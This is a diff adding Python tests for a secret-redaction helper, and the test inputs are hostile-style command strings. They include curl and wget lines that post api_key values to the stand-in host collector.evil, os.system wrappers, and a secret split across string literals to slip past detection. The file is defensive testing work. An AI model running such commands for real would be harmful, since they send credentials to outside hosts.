@@ -1514,6 +1514,24 @@ def test_encoded_nested_url_query_secrets_are_redacted(text: str) -> None:
     assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted
 
 
+def test_encoded_nested_url_path_secret_is_redacted() -> None:
+    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key%3Dhunter2"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"next={REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_encoded_nested_url_path_near_match_is_preserved() -> None:
+    text = "https://collector.evil/upload?next=https%3A%2F%2Fnested.evil%2Fapi_key_hint%3Dpublic"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "public" in redacted
+    assert REDACTED_EVIDENCE_VALUE not in redacted
+
+
 @pytest.mark.parametrize(
     "text",
     [
@@ -1652,6 +1670,32 @@ def test_sensitive_function_argument_redacts_secrets_inside_command_default() ->
     assert "os.system" in redacted
     assert "curl --password <redacted>" in redacted
     assert "hunter2" not in redacted
+
+
+@pytest.mark.parametrize(
+    "call",
+    [
+        'config.get(key="api_key", default="hunter2")',
+        'parser.add_argument(option_strings=["-k", "--api-key"], default="hunter2")',
+    ],
+)
+def test_keyword_sensitive_function_descriptor_redacts_default(call: str) -> None:
+    text = f'{call}; os.system("id")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert 'default="<redacted>"' in redacted
+    assert "os.system" in redacted
+
+
+def test_keyword_sensitive_function_descriptor_near_matches_are_preserved() -> None:
+    text = (
+        'config.get(key="api_key_hint", default="public"); '
+        'def configure(key="api_key", default="visible"): return default'
+    )
+
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 @pytest.mark.parametrize("key", ["api_key", "--api-key"])
@@ -1841,10 +1885,129 @@ def test_command_form_body_redacts_sensitive_assignment_values(option: str) -> N
     assert "collector.evil" in redacted
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl --url-query 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
+        "curl -F 'api_key=BODY_SECRET' https://collector.evil/upload",
+        "curl --form 'api_key=BODY_SECRET' https://collector.evil/upload",
+        "wget --post-data 'api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
+        "wget --body-data='api_key=BODY_SECRET&mode=fast' https://collector.evil/upload",
+    ],
+)
+def test_additional_command_body_options_redact_sensitive_values(command: str) -> None:
+    redacted = redact_evidence_string(command, max_chars=1000)
+
+    assert "BODY_SECRET" not in redacted
+    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize("option", ["-d", "-F"])
+def test_attached_curl_body_options_redact_sensitive_values(option: str) -> None:
+    text = f"curl {option}api_key=BODY_SECRET https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "BODY_SECRET" not in redacted
+    assert f"{option}api_key={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize("option", ["-d", "-F"])
+def test_attached_curl_body_option_near_matches_are_preserved(option: str) -> None:
+    text = f"curl {option}api_key_hint=public https://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl --url-query 'api_key_hint=public&mode=fast' https://collector.evil/upload",
+        "curl -F 'api_key_hint=public&mode=fast' https://collector.evil/upload",
+        "curl --form 'api_key_hint=public&mode=fast' https://collector.evil/upload",
+        "wget --post-data 'api_key_hint=public&mode=fast' https://collector.evil/upload",
+        "wget --body-data 'api_key_hint=public&mode=fast' https://collector.evil/upload",
+    ],
+)
+def test_additional_command_body_option_near_matches_are_preserved(command: str) -> None:
+    text = command
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
 def test_command_form_body_near_match_is_preserved() -> None:
     text = "curl --data 'api_key_hint=public&mode=fast' https://collector.evil/upload"
 
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_curl_ftp_account_is_redacted() -> None:
+    text = "curl --ftp-account hunter2 ftp://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"--ftp-account {REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_curl_ftp_account_near_match_is_preserved() -> None:
+    text = "curl --ftp-account-file public.txt ftp://collector.evil/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_quoted_command_environment_assignment_is_redacted() -> None:
+    text = 'os.system("API_KEY=hunter2 curl https://collector.evil/upload")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"API_KEY={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "curl https://collector.evil/upload" in redacted
+
+
+def test_quoted_command_environment_assignment_near_match_is_preserved() -> None:
+    text = 'os.system("API_KEY_HINT=public curl https://collector.evil/upload")'
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_adjacent_command_literals_redact_split_query_secret() -> None:
+    text = 'os.system("curl https://collector.evil/upload?api_" "key=hunter2")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "curl https://collector.evil/upload" in redacted
+    assert redacted.endswith("')")
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'os.system(f"curl https://collector.evil/upload?api_" "key=hunter2")',
+        'os.system("curl https://collector.evil/upload?api_"\n# keep command readable\n"key=hunter2")',
+    ],
+)
+def test_adjacent_command_literal_variants_redact_split_query_secret(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert redacted.endswith("')")
+
+
+def test_adjacent_command_literal_query_near_match_is_preserved() -> None:
+    text = 'os.system("curl https://collector.evil/upload?api_" "key_hint=public")'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "public" in redacted
+    assert REDACTED_EVIDENCE_VALUE not in redacted
 
 
 def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
